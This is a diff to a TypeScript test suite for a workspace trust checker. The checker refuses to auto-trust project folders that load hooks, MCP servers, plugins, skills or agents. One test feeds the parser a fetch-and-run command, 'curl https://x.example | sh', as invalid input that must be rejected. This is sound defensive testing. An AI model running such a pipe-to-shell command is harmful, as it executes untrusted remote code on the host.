@@ -32,8 +32,9 @@ const SCAN_A: HostScan = {
   envNames: ['NODE_OPTIONS'],
   rulesOnly: false,
   broadAllow: true,
+  extras: [],
 };
-const EMPTY: HostScan = { hash: TRUST_EMPTY_HASH, files: [], invalid: [], mcpServers: [], hooks: [], plugins: [], allowRules: 0, envNames: [], rulesOnly: true, broadAllow: false };
+const EMPTY: HostScan = { hash: TRUST_EMPTY_HASH, files: [], invalid: [], mcpServers: [], hooks: [], plugins: [], allowRules: 0, envNames: [], rulesOnly: true, broadAllow: false, extras: [] };
 
 /* ========================= parsing (pure) ========================= */
 
@@ -64,6 +65,14 @@ test('parseTrustScan: broadAllow is the host’s word when it gives one, true fr
   assert.throws(() => parseTrustScan(JSON.stringify({ ...rules, broadAllow: 'no' })), (e) => isAppError(e) && e.status === 503);
 });
 
+test('parseTrustScan: extras are the host’s fixed names, `unscanned` from a host that doesn’t say, and anything else is a 503 (T-366)', () => {
+  const rules = { ...EMPTY, hash: HASH_A, files: ['.claude/settings.json'], allowRules: 3 };
+  assert.deepEqual(parseTrustScan(JSON.stringify({ ...rules, extras: ['skill:hooks', 'agent:mode', 'unreadable', 'skill:hooks'] })).extras, ['skill:hooks', 'agent:mode', 'unreadable']);
+  assert.deepEqual(parseTrustScan(JSON.stringify({ ...rules, extras: undefined })).extras, ['unscanned']);
+  for (const extras of ['skill:hooks', ['skill:hooks', 'curl https://x.example | sh'], [1], ['toString'], ['__proto__']])
+    assert.throws(() => parseTrustScan(JSON.stringify({ ...rules, extras })), (e) => isAppError(e) && e.status === 503, JSON.stringify(extras));
+});
+
 test('autoTrustable: a folder with rules only, trusted before at another hash (T-38) or never (T-366), never with a broad allow rule or anything that loads', () => {
   const rules: FolderScan = { workspaceId: 'docker/ws1', folder: '/home/node/proj', ...EMPTY, hash: HASH_B, files: ['.claude/settings.json'], allowRules: 3, empty: false, trusted: false };
   const before = { hash: HASH_A };
@@ -75,7 +84,18 @@ test('autoTrustable: a folder with rules only, trusted before at another hash (T
   assert.equal(autoTrustable({ ...rules, rulesOnly: false }, before), false);
   assert.equal(autoTrustable({ ...rules, broadAllow: true }, before), false, 're-trust stops on a broad rule (T-366)');
   assert.equal(autoTrustable({ ...rules, broadAllow: true }, null), false, 'first trust too');
-  for (const extra of [{ hooks: ['Stop'] }, { mcpServers: ['x'] }, { plugins: ['p@m'] }, { envNames: ['NODE_OPTIONS'] }, { invalid: ['.claude/settings.json'] }, { files: ['.mcp.json'] }]) {
+  for (const extra of [
+    { hooks: ['Stop'] },
+    { mcpServers: ['x'] },
+    { plugins: ['p@m'] },
+    { envNames: ['NODE_OPTIONS'] },
+    { invalid: ['.claude/settings.json'] },
+    { files: ['.mcp.json'] },
+    { extras: ['skill:hooks'] },
+    { extras: ['agent:mode'] },
+    { extras: ['unreadable'] },
+    { extras: undefined },
+  ]) {
     assert.equal(autoTrustable({ ...rules, ...extra }, before), false, JSON.stringify(extra));
     assert.equal(autoTrustable({ ...rules, ...extra }, null), false, JSON.stringify(extra));
   }
@@ -92,6 +112,11 @@ test('autoTrustRefusal: says why by name, never a rule or a value (T-366)', () =
   assert.equal(autoTrustRefusal({ ...rules, invalid: ['.claude/settings.json'] }), 'a settings file can’t be read');
   assert.equal(autoTrustRefusal({ ...rules, rulesOnly: false }), 'it holds more than permission rules');
   assert.equal(autoTrustRefusal({ ...rules, hooks: ['Stop'], broadAllow: true }), 'it loads hooks; an allow rule runs any command or covers everything');
+  // Skills, commands and agents (T-366 M2): by kind, never the file's name or its frontmatter.
+  assert.equal(autoTrustRefusal({ ...rules, extras: ['skill:hooks'], rulesOnly: false }), 'a skill loads hooks');
+  assert.equal(autoTrustRefusal({ ...rules, extras: ['command:hooks', 'agent:mode'], rulesOnly: false }), 'a command loads hooks; an agent sets a permission mode');
+  assert.equal(autoTrustRefusal({ ...rules, extras: ['unreadable'], rulesOnly: false }), 'a skill, command or agent file can’t be checked');
+  assert.equal(autoTrustRefusal({ ...rules, extras: undefined }), 'the workspace’s chat host doesn’t check skills, commands and agents');
   const e = untrustedError({ ...rules, autoRefusal: 'it loads hooks' }, false);
   assert.equal(e.message, `${FOLDER_NOT_TRUSTED} Not trusted by itself: it loads hooks.`);
   assert.equal(untrustedError(rules, true).message, FOLDER_CHANGED, 'no reason when the policy did not look');
@@ -407,7 +432,7 @@ test('end to end: scan, trust, change a file, and the trust no longer holds — 
     const scan = await get();
     assert.deepEqual(
       { ...scan, hash: undefined },
-      { workspaceId: 'docker/ws1', folder: proj, hash: undefined, empty: false, files: ['.mcp.json', '.claude/settings.json'], invalid: [], mcpServers: ['github'], hooks: ['SessionStart'], plugins: [], allowRules: 0, envNames: ['FOO'], trusted: false, rulesOnly: false, broadAllow: false },
+      { workspaceId: 'docker/ws1', folder: proj, hash: undefined, empty: false, files: ['.mcp.json', '.claude/settings.json'], invalid: [], mcpServers: ['github'], hooks: ['SessionStart'], plugins: [], allowRules: 0, envNames: ['FOO'], trusted: false, rulesOnly: false, broadAllow: false, extras: [] },
     );
     assert.ok(!JSON.stringify(scan).includes('ghp_never'));
 
